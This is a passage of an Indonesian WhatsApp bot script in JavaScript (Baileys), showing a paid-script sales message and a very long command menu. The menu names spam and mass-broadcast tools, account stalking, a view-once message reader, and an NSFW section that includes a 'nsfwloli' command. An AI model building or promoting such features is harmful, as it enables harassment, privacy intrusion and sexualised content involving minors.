* Family100
* YouTuber
* DLL
*Spesial Features*
* Ml stalk ( with region )
* Mc status ( Cek status server mc )
* DLL


🧾 Info Script
*Script Baileys*
* Type Case
* Module (baileys)
* Support All Button

🏷️ Price List
* Price *Rp.15,000*
* Garansi 15 Days
* Free ApiKey
* No Update!!

* Price *Rp.40,000*
* Garansi 3 Bulan
* Free ApiKey
* Free Update

mau sc ini?, jika benar mau silahkan hubungi nomer di bawah ini

ᴏᴡɴᴇʀ :
${global.owner}
`
TradzSigma.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 40000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
}
break;
case 'allmenu':{
TradzSigma.sendMessage(m.chat, { react: { text: `🔍`, key: m.key }})
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
let menunya = `Halo Kak *${pushname}* jangan spam🎗

◤─「 \`INFO USER\` 」──✦
 ⎆  [ Nama : ${pushname}
 ⎆  [ Role : ${TradID ? 'Boss🥇' : isPrem ? 'Investor💵' : 'Gratisan😩'}
 ⎆  [ Mode : ${TradzSigma.public ? 'Public' : 'Private'}
 ⎆  [ Author : ${global.ownername}
◣──────────❈

◤─「 \`INFO BOT\` 」──✦
 ⎆ Runtime : ${runtime(process.uptime())}
 ⎆ Versi : ${global.version}
 ⎆ Respon : ${latensi.toFixed(4)}
◣─────────────✦

*_Jangan Di Spam Ya Agar Botnya Bisa Aktif 24 Jam Dan Tidak Terkena Blokir Spam🍁_*

> *Mohon untuk membaca rules bot biar terhindar dari kenon*
> *Knp bang?, Hey gw kasih tau ya lu spam itu bikin bot nyepam*

Mohon Untuk Pengertianya agar nomer bot tidak kenon

*Kalau ada fitur bug atau error kontak onwer ya*       

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

${generateFandomCode() }

◤─「 \`OWNER MENU\` 」─✦
│⟡ 〔 _.autoread_
│⟡ 〔 _.upchv2_
│⟡ 〔 _.addsewa_
│⟡ 〔 _.delwa_
│⟡ 〔 _.onlypc_
│⟡ 〔 _.onlygc_
│⟡ 〔 _.self_
│⟡ 〔 _.clearchat_
│⟡ 〔 _.pinchat_
│⟡ 〔 _.unpinchat_
│⟡ 〔 _.gconly_ 
│⟡ 〔 _.public_ 
│⟡ 〔 _.setpppanjang_ 
│⟡ 〔 _.setppgcpanjang_ 
│⟡ 〔 _.addcase_
│⟡ 〔 _.join_ 
│⟡ 〔 _.bctext_ 
│⟡ 〔 _.poll_ 
│⟡ 〔 _.bcimage_
│⟡ 〔 _.bcvideo_
│⟡ 〔 _.creategc_
│⟡ 〔 _.setexif_
│⟡ 〔 _.userjid_
│⟡ 〔 _.setbotname_
│⟡ 〔 _.setbotbio_
│⟡ 〔 _.delppbot_
│⟡ 〔 _.restart_
│⟡ 〔 _.setppbot_
│⟡ 〔 _.addprem_
│⟡ 〔 _.delprem_
│⟡ 〔 _.addowner_
│⟡ 〔 _.delowner_
│⟡ 〔 _.addvn_
│⟡ 〔 _.delvn_
│⟡ 〔 _.addsticker_
│⟡ 〔 _.delsticker_
│⟡ 〔 _.addimage_
│⟡ 〔 _.delimage_
│⟡ 〔 _.addvideo_
│⟡ 〔 _.delvideo_
│⟡ 〔 _.block_
│⟡ 〔 _.unblock del_
│⟡ 〔 _.leavegc_
│⟡ 〔 _.pushkontak_
│⟡ 〔 _.pushkontakv2_
│⟡ 〔 _.pushkontakv3_
│⟡ 〔 _.pushkontakv4_
│⟡ 〔 _.savekontakv_
│⟡ 〔 _.savekontakv2_
│⟡ 〔 _.getkontak_
│⟡ 〔 _.sendkontak_
│⟡ 〔 _.jpm_
│⟡ 〔 _.jpm2_
│⟡ 〔 _.autoreadsw_
◣──────────❈
◤─「 \`STORE MENU\` 」─✦ 
│⟡ 〔 _.list_
│⟡ 〔 _.addlist_
│⟡ 〔 _.dellist_
│⟡ 〔 _.update_
│⟡ 〔 _.jeda_
│⟡ 〔 _.tambah_
│⟡ 〔 _.kurang_
│⟡ 〔 _.kali_
│⟡ 〔 _.bagi_
│⟡ 〔 _.delsetdone_
│⟡ 〔 _.changedone_
│⟡ 〔 _.setdone_
│⟡ 〔 _.delproses_
│⟡ 〔 _.changeproses_
│⟡ 〔 _.setproses_
│⟡ 〔 _.proses <reply chat>_
│⟡ 〔 _.done <reply chat>_
◣──────────❈
◤─「 \`NEW UPDATE\` 」─✦
│⟡ 〔 _.nglspam_
│⟡ 〔 _.bratvideo_
│⟡ 〔 _.chord_
│⟡ 〔 _.nulishitam_
│⟡ 〔 _.readmore_
│⟡ 〔 _.mcmap_
│⟡ 〔 _.aigen_
│⟡ 〔 _.romchat_
│⟡ 〔 _.animebrat_
│⟡ 〔 _.animebrat-vid_
│⟡ 〔 _.totalchat_
│⟡ 〔 _.hytamkan_ 
│⟡ 〔 _.totalfitur_
│⟡ 〔 _.superhd_
│⟡ 〔 _.youtubestalk_
│⟡ 〔 _.carimusic_
│⟡ 〔 _.antitagsw_
│⟡ 〔 _.enchard_
│⟡ 〔 _.buatlogo_
│⟡ 〔 _.chat_
│⟡ 〔 _.upch_
│⟡ 〔 _.rch [ with text ]_
│⟡ 〔 _.startjpmslide_
│⟡ 〔 _.ngl_
│⟡ 〔 _.giveaway_
│⟡ 〔 _.unreg_
│⟡ 〔 _.belipanel_
│⟡ 〔 _.shopmenu_
│⟡ 〔 _.deposit_ (semi otomatis)
│⟡ 〔 _.addsaldo_
│⟡ 〔 _.ceksaldo_
│⟡ 〔 _.buypanel_
│⟡ 〔 _.upch1_
│⟡ 〔 _.limit_
│⟡ 〔 _.addlimit_
│⟡ 〔 _.addmoney_
│⟡ 〔 _.resetlimit_
│⟡ 〔 _.toplimit_
│⟡ 〔 _.topmoney_
│⟡ 〔 _.resetmoney_
│⟡ 〔 _.cekmoney_
│⟡ 〔 _.mymoney_
│⟡ 〔 _.font_
│⟡ 〔 _.fontlist_
│⟡ 〔 _.saran_
│⟡ 〔 _.autoreadsw_
│⟡ 〔 _.backup_
│⟡ 〔 _.yta_ (audio)
│⟡ 〔 _.ytv_ (video quality)
│⟡ 〔 _.setautosholat_
◣──────────❈
◤─「 \`SHOP MENU\` 」─✦
│⟡ 〔 _.belipanel_
│⟡ 〔 _.shopmenu_
│⟡ 〔 _.deposit_
│⟡ 〔 _.addsaldo_
│⟡ 〔 _.ceksaldo_
│⟡ 〔 _.buypanel_
│⟡ 〔 _.takesaldo_
│⟡ 〔 _.resetsaldo_
◣──────────❈
◤─「 \`CHAR AI\` 」─✦
│⟡ 〔 _.hutao-cai_
│⟡ 〔 _.kurumi-cai_
│⟡ 〔 _.elaina-cai_
◣──────────❈
◤─「 \`FITUR FIX\` 」─✦
│⟡ 〔 _.nulis_
│⟡ 〔 _.sertifikatmenu_
│⟡ 〔 _.jadianime_
│⟡ 〔 _.hdvid_
│⟡ 〔 _.ytplay_
│⟡ 〔 _.removebg_
│⟡ 〔 _.terabox_
│⟡ 〔 _.ytmp3_
│⟡ 〔 _.hd_
│⟡ 〔 _.mediafire_
│⟡ 〔 _.xnxxsearch_
│⟡ 〔 _.cuaca_
│⟡ 〔 _.bratvideo_
│⟡ 〔 _.myip_
│⟡ 〔 _.welcome2_
│⟡ 〔 _.reactch_
│⟡ 〔 _.ytmp4_
│⟡ 〔 _.qc_
│⟡ 〔 _.lyrics_
│⟡ 〔 _.yts_
│⟡ 〔 _.paptt_
│⟡ 〔 _.antilink_
│⟡ 〔 _.welcome_
│⟡ 〔 _.changewelcome_
│⟡ 〔 _.rvo_
│⟡ 〔 _.jpm_
│⟡ 〔 _.pushkontak_
│⟡ 〔 _.onlypc_
│⟡ 〔 _.onlygc_
◣──────────❈
◤─「 \`ISLAM MENU\` 」─✦
│⟡ 〔 _.kisahnabi_
│⟡ 〔 _.asmaulhusna_
│⟡ 〔 _.bacaansholat_
│⟡ 〔 _.audiosurah_
│⟡ 〔 _.ayatkursi_
│⟡ 〔 _.doaharian_
│⟡ 〔 _.niatsholat_
│⟡ 〔 _.quotes_
│⟡ 〔 _.sholat_
│⟡ 〔 _.doatahlil_
│⟡ 〔 _.tafsir_
│⟡ 〔 _.jadwalsholat_
◣──────────❈
◤─「 \`GROUP MENU\` 」─✦
│⟡ 〔 _.mute_
│⟡ 〔 _.welcome on/off_
│⟡ 〔 _.antilink_
│⟡ 〔 _.antiwame_
│⟡ 〔 _.linkgc_
│⟡ 〔 _.invite_
│⟡ 〔 _.delete_
│⟡ 〔 _.setppgroup_
│⟡ 〔 _.delppgroup_
│⟡ 〔 _.setname_
│⟡ 〔 _.setdesc_
│⟡ 〔 _.add_
│⟡ 〔 _.kick_
│⟡ 〔 _.promote_
│⟡ 〔 _.demote_
│⟡ 〔 _.hidetag_
│⟡ 〔 _.totag_
│⟡ 〔 _.tagall_
│⟡ 〔 _.editinfo_
│⟡ 〔 _.opentime_
│⟡ 〔 _.closetime_
│⟡ 〔 _.resetlink_
│⟡ 〔 _.getbio_
│⟡ 〔 _.vote_
│⟡ 〔 _.upvote_
│⟡ 〔 _.downvote_
│⟡ 〔 _.checkvote_
│⟡ 〔 _.delvote_
│⟡ 〔 _.autostickergc_
│⟡ 〔 _.antilinkgc_
│⟡ 〔 _.antiwame_
│⟡ 〔 _.antilinkall_
│⟡ 〔 _.antilinktiktok_
│⟡ 〔 _.antilinkfb_
│⟡ 〔 _.antilinktwitter_
│⟡ 〔 _.antilinkig_
│⟡ 〔 _.antilinktg_
│⟡ 〔 _.antilinkytvid_
│⟡ 〔 _.antilinkytch_
│⟡ 〔 _.antivirus_
│⟡ 〔 _.antitoxic_
│⟡ 〔 _.nsfw_
│⟡ 〔 _.react_
◣──────────❈
◤─「 \`ANONYMOUS\` 」─✦
│⟡ 〔 _.anonymouschat_
│⟡ 〔 _.start_
│⟡ 〔 _.next_
│⟡ 〔 _.stop_
│⟡ 〔 _.sendprofile_
│⟡ 〔 _.menfess_
│⟡ 〔 _.confess_
│⟡ 〔 _.balasmenfess_
│⟡ 〔 _.tolakmenfess_
│⟡ 〔 _.stopmenfess_
◣──────────❈
◤─「 \`PUSH MENU\` 」─✦
│⟡ 〔 _.cekidgc_
│⟡ 〔 _.pushkontak_
│⟡ 〔 _.pushkontakv2_
│⟡ 〔 _.pushkontakv3_
│⟡ 〔 _.pushkontakv4_
│⟡ 〔 _.savekontakv_
│⟡ 〔 _.savekontakv2_
│⟡ 〔 _.getkontak_
│⟡ 〔 _.sendkontak_
│⟡ 〔 _.jpm_
│⟡ 〔 _.jpm2_
◣──────────❈
◤─「 \`PANEL MENU\` 」─✦
│⟡ 〔 _.1gb_
│⟡ 〔 _.2gb_
│⟡ 〔 _.3gb_
│⟡ 〔 _.4gb_
│⟡ 〔 _.5gb_
│⟡ 〔 _.6gb_
│⟡ 〔 _.7g_
│⟡ 〔 _.8gb_
│⟡ 〔 _.9gb_
│⟡ 〔 _.10gb_
│⟡ 〔 _.unli_
│⟡ 〔 _.cadmin_
◣──────────❈
◤─「 \`PANEL-V2 MENU\` 」─✦
│⟡ 〔 _.1gb-v2_
│⟡ 〔 _.2gb-v2_
│⟡ 〔 _.3gb-v2_
│⟡ 〔 _.4gb-v2_
│⟡ 〔 _.5gb-v2_
│⟡ 〔 _.6gb-v2_
│⟡ 〔 _.7gb-v2_
│⟡ 〔 _.8gb-v2_
│⟡ 〔 _.9gb-v2_
│⟡ 〔 _.10gb-v2_
│⟡ 〔 _.unli-v2_
│⟡ 〔 _.cadmin-v2_
◣──────────❈
◤─「 \`CPANEL MENU\` 」─✦
│⟡ 〔 _.listusr_
│⟡ 〔 _.delusr_
│⟡ 〔 _.listsrv_
│⟡ 〔 _.delsrv_
│⟡ 〔 _.tutorial_
│⟡ 〔 _.ramlist_
│⟡ 〔 _.premlist_
│⟡ 〔 _.updatesrv_
│⟡ 〔 _.suspend_
│⟡ 〔 _.unsuspend_
│⟡ 〔 _.createadmin_
│⟡ 〔 _.listadmin_
◣──────────❈
◤─「 \`DOWNLOAD MENU\` 」─✦
│⟡ 〔 _.tiktoks_
│⟡ 〔 _.tiktokslide_
│⟡ 〔 _.videy_
│⟡ 〔 _.yts_
│⟡ 〔 _.play_
│⟡ 〔 _.playspotify_
│⟡ 〔 _.ytmp3_
│⟡ 〔 _.ytmp4_
│⟡ 〔 _.instagram_
│⟡ 〔 _.facebook_
│⟡ 〔 _.spotify_
│⟡ 〔 _.pinterest_
◣──────────❈
◤─「 \`GAME MENU\` 」─✦
│⟡ 〔 _.tebakkata_
│⟡ 〔 _.tebaktebakan_
│⟡ 〔 _.tebaklirik_
│⟡ 〔 _.tebakgambar_
│⟡ 〔 _.tebaklagu_
│⟡ 〔 _.tebakkimia_
│⟡ 〔 _.asahotak_
│⟡ 〔 _.siapaaku_
│⟡ 〔 _.susunkata_
│⟡ 〔 _.tekateki_
│⟡ 〔 _.tebakbendera_
│⟡ 〔 _.tebakbenderav2_
│⟡ 〔 _.tebakkabupaten_
│⟡ 〔 _.caklontong_
│⟡ 〔 _.family100_
│⟡ 〔 _.werewolf_
◣──────────❈
◤─「 \`RPG MENU\` 」─✦
COMMING SOON
◣──────────❈
◤─「 \`QUOTES MENU\` 」─✦
│⟡ 〔 _.quotesanime_ 
│⟡ 〔 _.quotesbacot_ 
│⟡ 〔 _.quotesbucin_ 
│⟡ 〔 _.quotesmotivasi_ 
│⟡ 〔 _.quotesgalau_ 
│⟡ 〔 _.quotesgombal_ 
│⟡ 〔 _.quoteshacker_ 
│⟡ 〔 _.quotesbijak_ 
◣──────────❈
◤─「 \`RANDOM VIDEO\` 」─✦
│⟡ 〔 _.tiktokgirl_
│⟡ 〔 _.tiktoknukthy_
│⟡ 〔 _.tiktokkayes_
│⟡ 〔 _.tiktokpanrika_
│⟡ 〔 _.tiktoknotnot_
│⟡ 〔 _.tiktokghea_
│⟡ 〔 _.tiktoksantuy_
│⟡ 〔 _.tiktokbocil_
◣──────────❈
◤─「 \`STALK MENU\` 」─✦
│⟡ 〔 _.igstalk_
│⟡ 〔 _.ttstalk_
│⟡ 〔 _.ffstalk_
│⟡ 〔 _.mlstalk_
│⟡ 〔 _.npmstalk_
│⟡ 〔 _.ghstalk_
│⟡ 〔 _.ytstalk_
◣──────────❈
◤─「 \`OPEN AI\` 」─✦
│⟡ 〔 _.leptonai_
│⟡ 〔 _.openai_
│⟡ 〔 _.ai_
│⟡ 〔 _.hutaoai_
│⟡ 〔 _.bard_
│⟡ 〔 _.prodia_
│⟡ 〔 _.diffusion-anime_
│⟡ 〔 _.travel-assistant_
│⟡ 〔 _.ocr_
│⟡ 〔 _.guru-ai_
│⟡ 〔 _.emi-ai_
│⟡ 〔 _.claude-ai_
│⟡ 〔 _.costume-ai_
│⟡ 〔 _.herc-ai_
│⟡ 〔 _.hercai-cartoon_
│⟡ 〔 _.hercai-animefy_
│⟡ 〔 _.hercai-lexica_
│⟡ 〔 _.hercai-prodia_
│⟡ 〔 _.hercai-simurg_
│⟡ 〔 _.hercai-raava_
│⟡ 〔 _.hercai-shonin_
│⟡ 〔 _.realistic_
│⟡ 〔 _.3dmodel_
│⟡ 〔 _.jadizombie_
│⟡ 〔 _.blackboxai_
│⟡ 〔 _.photoleapai_
│⟡ 〔 _.diffusion_
│⟡ 〔 _.indo-ai_
│⟡ 〔 _.lamaai_
│⟡ 〔 _.aivo_
│⟡ 〔 _.gemini_
│⟡ 〔 _.text2img_
│⟡ 〔 _.absolutely_
│⟡ 〔 _.dalle_
│⟡ 〔 _.bingimg_
│⟡ 〔 _.bingai_
│⟡ 〔 _.gptimg_
│⟡ 〔 _.gpt4_
│⟡ 〔 _.gpt4_2_
│⟡ 〔 _.anything_
│⟡ 〔 _.hdvid_
│⟡ 〔 _.cai_
│⟡ 〔 _.youai_
│⟡ 〔 _.remini_
│⟡ 〔 _.jadianime_
│⟡ 〔 _.removebg_
│⟡ 〔 _.nulis_
◣──────────❈
◤─「 \`FUN MENU\` 」─✦
│⟡ 〔 _.smeme_
│⟡ 〔 _.ppcouple_
│⟡ 〔 _.define_
│⟡ 〔 _.qc_
│⟡ 〔 _.qcwarna_
│⟡ 〔 _.kodeqc_
│⟡ 〔 _.lyrics_
│⟡ 〔 _.suit_
│⟡ 〔 _.math_
│⟡ 〔 _.tictactoe_
│⟡ 〔 _.fact_
│⟡ 〔 _.truth_
│⟡ 〔 _.dare_
│⟡ 〔 _.couple_
│⟡ 〔 _.soulmate_
│⟡ 〔 _.stupidcheck_
│⟡ 〔 _.handsomecheck_
│⟡ 〔 _.uncleancheck_
│⟡ 〔 _.hotcheck_
│⟡ 〔 _.smartcheck_
│⟡ 〔 _.greatcheck_
│⟡ 〔 _.evilcheck_
│⟡ 〔 _.dogcheck_
│⟡ 〔 _.coolcheck_
│⟡ 〔 _.waifucheck_
│⟡ 〔 _.awesomecheck_
│⟡ 〔 _.gaycheck_
│⟡ 〔 _.cutecheck_
│⟡ 〔 _.lesbiancheck_
│⟡ 〔 _.hornycheck_
│⟡ 〔 _.prettycheck_
│⟡ 〔 _.lovelycheck_
│⟡ 〔 _.uglycheck_
│⟡ 〔 _.pick_
│⟡ 〔 _.quotes_
│⟡ 〔 _.can_
│⟡ 〔 _.is_
│⟡ 〔 _.when_
│⟡ 〔 _.where_
│⟡ 〔 _.what_
│⟡ 〔 _.how_
│⟡ 〔 _.rate_
│⟡ 〔 _.cry_
│⟡ 〔 _.kill_
│⟡ 〔 _.hug_
│⟡ 〔 _.pat_
│⟡ 〔 _.lick_
│⟡ 〔 _.kiss_
│⟡ 〔 _.bite_
│⟡ 〔 _.yeet_
│⟡ 〔 _.bully_
│⟡ 〔 _.bonk_
│⟡ 〔 _.wink_
│⟡ 〔 _.poke_
│⟡ 〔 _.nom_
│⟡ 〔 _.slap_
│⟡ 〔 _.smile_
│⟡ 〔 _.wave_
│⟡ 〔 _.awoo_
│⟡ 〔 _.blush_
│⟡ 〔 _.smug_
│⟡ 〔 _.glomp_
│⟡ 〔 _.happy_
│⟡ 〔 _.dance_
│⟡ 〔 _.cringe_
│⟡ 〔 _.cuddle_
│⟡ 〔 _.highfive_
│⟡ 〔 _.shinobu_
│⟡ 〔 _.handhold_
│⟡ 〔 _.tickle_
│⟡ 〔 _.avatar_
│⟡ 〔 _.feed_
│⟡ 〔 _.foxgirl_
│⟡ 〔 _.gecg_
│⟡ 〔 _.checkme_
│⟡ 〔 _.sound1 - sound161_
◣──────────❈
◤─「 \`RANDOM PHOTO\` 」─✦
│⟡ 〔 _.aesthetic_
│⟡ 〔 _.coffee_
│⟡ 〔 _.wikimedia_
│⟡ 〔 _.wallpaper_
│⟡ 〔 _.art_
│⟡ 〔 _.bts_
│⟡ 〔 _.dogwoof_
│⟡ 〔 _.catmeow_
│⟡ 〔 _.lizardpic_
│⟡ 〔 _.goosebird_
│⟡ 〔 _.8ballpool_
│⟡ 〔 _.cosplay_
│⟡ 〔 _.hacker_
│⟡ 〔 _.cyber_
│⟡ 〔 _.gamewallpaper_
│⟡ 〔 _.islamic_
│⟡ 〔 _.jennie_
│⟡ 〔 _.jiso_
│⟡ 〔 _.satanic_
│⟡ 〔 _.justina_
│⟡ 〔 _.cartoon_
│⟡ 〔 _.pentol_
│⟡ 〔 _.cat_
│⟡ 〔 _.kpop_
│⟡ 〔 _.exo_
│⟡ 〔 _.lisa_
│⟡ 〔 _.space_
│⟡ 〔 _.car_
│⟡ 〔 _.technology_
│⟡ 〔 _.bike_
│⟡ 〔 _.shortquote_
│⟡ 〔 _.antiwork_
│⟡ 〔 _.hacking_
│⟡ 〔 _.boneka_
│⟡ 〔 _.rose_
│⟡ 〔 _.ryujin_
│⟡ 〔 _.ulzzangboy_
│⟡ 〔 _.ulzzanggirl_
│⟡ 〔 _.wallml_
│⟡ 〔 _.wallphone_
│⟡ 〔 _.mountain_
│⟡ 〔 _.goose_
│⟡ 〔 _.profilepic_
│⟡ 〔 _.couplepic_
│⟡ 〔 _.programming_
│⟡ 〔 _.pubg_
│⟡ 〔 _.blackpink_
│⟡ 〔 _.randomboy_
│⟡ 〔 _.randomgirl_
│⟡ 〔 _.hijab_
│⟡ 〔 _.chinese_
│⟡ 〔 _.indo_
│⟡ 〔 _.japanese_
│⟡ 〔 _.korean_
│⟡ 〔 _.malay_
│⟡ 〔 _.thai_
│⟡ 〔 _.vietnamese_
◣──────────❈
◤─「 \`STICKER\` 」─✦
│⟡ 〔 _.goose_
│⟡ 〔 _.woof_
│⟡ 〔 _.8ball_
│⟡ 〔 _.lizard_
│⟡ 〔 _.meow_
│⟡ 〔 _.gura_
│⟡ 〔 _.doge_
│⟡ 〔 _.patrick_
│⟡ 〔 _.lovestick_
◣──────────❈
◤─「 \`ANIME\` 」─✦
│⟡ 〔 _.akira_
│⟡ 〔 _.akiyama_
│⟡ 〔 _.ana_
│⟡ 〔 _.asuna_
│⟡ 〔 _.ayuzawa_
│⟡ 〔 _.boruto_
│⟡ 〔 _.chiho_
│⟡ 〔 _.chitoge_
│⟡ 〔 _.cosplayloli_
│⟡ 〔 _.cosplaysagiri_
│⟡ 〔 _.deidara_
│⟡ 〔 _.doraemon_
│⟡ 〔 _.elaina_
│⟡ 〔 _.emilia_
│⟡ 〔 _.erza_
│⟡ 〔 _.gremory_
│⟡ 〔 _.hestia_
│⟡ 〔 _.hinata_
│⟡ 〔 _.husbu_
│⟡ 〔 _.inori_
│⟡ 〔 _.isuzu_
│⟡ 〔 _.itachi_
│⟡ 〔 _.itori_
│⟡ 〔 _.kaga_
│⟡ 〔 _.kagura_
│⟡ 〔 _.kakasih_
│⟡ 〔 _.kaori_
│⟡ 〔 _.keneki_
│⟡ 〔 _.kotori_
│⟡ 〔 _.kurumi_
│⟡ 〔 _.loli_
│⟡ 〔 _.madara_
│⟡ 〔 _.megumin_
│⟡ 〔 _.mikasa_
│⟡ 〔 _.mikey_
│⟡ 〔 _.miku_
│⟡ 〔 _.minato_
│⟡ 〔 _.naruto_
│⟡ 〔 _.neko_
│⟡ 〔 _.neko2_
│⟡ 〔 _.nekonime_
│⟡ 〔 _.nezuko_
│⟡ 〔 _.onepiece_
│⟡ 〔 _.pokemon_
│⟡ 〔 _.randomnime_
│⟡ 〔 _.randomnime2_
│⟡ 〔 _.rize_
│⟡ 〔 _.sagiri_
│⟡ 〔 _.sakura_
│⟡ 〔 _.sasuke_
│⟡ 〔 _.shina_
│⟡ 〔 _.shinka_
│⟡ 〔 _.shinomiya_
│⟡ 〔 _.shizuka_
│⟡ 〔 _.shota_
│⟡ 〔 _.tejina_
│⟡ 〔 _.toukachan_
│⟡ 〔 _.tsunade_
│⟡ 〔 _.waifu_
│⟡ 〔 _.animewall_
│⟡ 〔 _.yotsuba_
│⟡ 〔 _.yuki_
│⟡ 〔 _.yulibocil_
│⟡ 〔 _.yumeko_
│⟡ 〔 _.8ball_
│⟡ 〔 _.tickle_
│⟡ 〔 _.gecg_
│⟡ 〔 _.feed_
│⟡ 〔 _.animeawoo_
│⟡ 〔 _.animemegumin_
│⟡ 〔 _.animeshinobu_
│⟡ 〔 _.animehandhold_
│⟡ 〔 _.animehighfive_
│⟡ 〔 _.animecringe_
│⟡ 〔 _.animedance_
│⟡ 〔 _.animehappy_
│⟡ 〔 _.animeglomp_
│⟡ 〔 _.animeblush_
│⟡ 〔 _.animesmug_
│⟡ 〔 _.animewave_
│⟡ 〔 _.animesmile_
│⟡ 〔 _.animepoke_
│⟡ 〔 _.animewink_
│⟡ 〔 _.animebonk_
│⟡ 〔 _.animebully_
│⟡ 〔 _.animeyeet_
│⟡ 〔 _.animebite_
│⟡ 〔 _.animelick_
│⟡ 〔 _.animekill_
│⟡ 〔 _.animecry_
│⟡ 〔 _.animewlp_
│⟡ 〔 _.animekiss_
│⟡ 〔 _.animehug_
│⟡ 〔 _.animeneko_
│⟡ 〔 _.animepat_
│⟡ 〔 _.animeslap_
│⟡ 〔 _.animecuddle_
│⟡ 〔 _.animewaifu_
│⟡ 〔 _.animenom_
│⟡ 〔 _.animefoxgirl_
│⟡ 〔 _.animegecg_
│⟡ 〔 _.animetickle_
│⟡ 〔 _.animefeed_
│⟡ 〔 _.animeavatar_
│⟡ 〔 _.genshin_
│⟡ 〔 _.anime_
│⟡ 〔 _.amv_
◣──────────❈
◤─「 \`NSFW MENU\` 」─✦
│⟡ 〔 _.hentai_
│⟡ 〔 _.listbkp_
│⟡ 〔 _.gifhenta_
│⟡ 〔 _.gifblowjob_ 
│⟡ 〔 _.hentaivid_ 
│⟡ 〔 _.hneko_ 
│⟡ 〔 _.nwaifu_ 
│⟡ 〔 _.animespank_ 
│⟡ 〔 _.trap_ 
│⟡ 〔 _.gasm_ 
│⟡ 〔 _.ahegao_ 
│⟡ 〔 _.ass_ 
│⟡ 〔 _.bdsm_
│⟡ 〔 _.blowjob_ 
│⟡ 〔 _.cuckold_ 
│⟡ 〔 _.cum_ 
│⟡ 〔 _.milf_ 
│⟡ 〔 _.eba_ 
│⟡ 〔 _.ero_ 
│⟡ 〔 _.femdom_ 
│⟡ 〔 _.foot_ 
│⟡ 〔 _.gangbang_ 
│⟡ 〔 _.glasses_ 
│⟡ 〔 _.jahy_ 
│⟡ 〔 _.masturbation_
│⟡ 〔 _.mangasearch_ 
│⟡ 〔 _.neko-hentai_ 
│⟡ 〔 _.neko-hentai2_ 
│⟡ 〔 _.nsfwloli_ 
│⟡ 〔 _.orgy_
│⟡ 〔 _.panties_  
│⟡ 〔 _.pussy_ 
│⟡ 〔 _.tentacles_ 
│⟡ 〔 _.thighs_ 
│⟡ 〔 _.yuri_ 
│⟡ 〔 _.zettai_
│⟡ 〔 _.xnxxsearch_
│⟡ 〔 _.xnxxdl_
◣──────────❈
◤─「 \`EPHOTO MAKER\` 」─✦
│⟡ 〔 _.glitchtext_
│⟡ 〔 _.writetext_
│⟡ 〔 _.advancedglow_
│⟡ 〔 _.typographytext_
│⟡ 〔 _.pixelglitch_
│⟡ 〔 _.neonglitch_
│⟡ 〔 _.flagtext_
│⟡ 〔 _.flag3dtext_
│⟡ 〔 _.deletingtext_
│⟡ 〔 _.blackpinkstyle_
│⟡ 〔 _.glowingtext_
│⟡ 〔 _.underwatertext_
│⟡ 〔 _.logomaker_
│⟡ 〔 _.cartoonstyle_
│⟡ 〔 _.papercutstyle_
│⟡ 〔 _.watercolortext_
│⟡ 〔 _.effectclouds_
│⟡ 〔 _.blackpinklogo_
│⟡ 〔 _.gradienttext_
│⟡ 〔 _.summerbeach_
│⟡ 〔 _.luxurygold_
│⟡ 〔 _.multicoloredneon_
│⟡ 〔 _.sandsummer_
│⟡ 〔 _.galaxywallpaper_
│⟡ 〔 _.1917style_
│⟡ 〔 _.makingneon_
│⟡ 〔 _.royaltext_
│⟡ 〔 _.freecreate_
│⟡ 〔 _.galaxystyle_
│⟡ 〔 _.lighteffects_
◣──────────❈
◤─「 \`OTHER MENU\` 」─✦
│⟡ 〔 _.ping_
│⟡ 〔 _.brat_
│⟡ 〔 _.ceksewa_
│⟡ 〔 _.listsewa_
│⟡ 〔 _.readviewonce_
│⟡ 〔 _.cekkhodam_
│⟡ 〔 _.paptt_
│⟡ 〔 _.alkitab_
│⟡ 〔 _.totalfitur_
│⟡ 〔 _.menu_
│⟡ 〔 _.myip_
│⟡ 〔 _.reportbug_
│⟡ 〔 _.listpem_
│⟡ 〔 _.liststicker_
│⟡ 〔 _.listimage_
│⟡ 〔 _.listvideo_
│⟡ 〔 _.listvn_
│⟡ 〔 _.listbadword_
│⟡ 〔 _.listpc_
│⟡ 〔 _.listgc_
│⟡ 〔 _.owner_
│⟡ 〔 _.jadibot_
│⟡ 〔 _.listjadibot_
│⟡ 〔 _.donate_
│⟡ 〔 _.friend_
│⟡ 〔 _.obfuscate_
│⟡ 〔 _.styletext_
│⟡ 〔 _.fliptext_
│⟡ 〔 _.tts_
│⟡ 〔 _.say_
│⟡ 〔 _.togif_
│⟡ 〔 _.toqr_
│⟡ 〔 _.bass_
│⟡ 〔 _.blown_
│⟡ 〔 _.deep_
│⟡ 〔 _.earrape_
│⟡ 〔 _.fast_
│⟡ 〔 _.fat_
│⟡ 〔 _.nightcore_
│⟡ 〔 _.reverse_
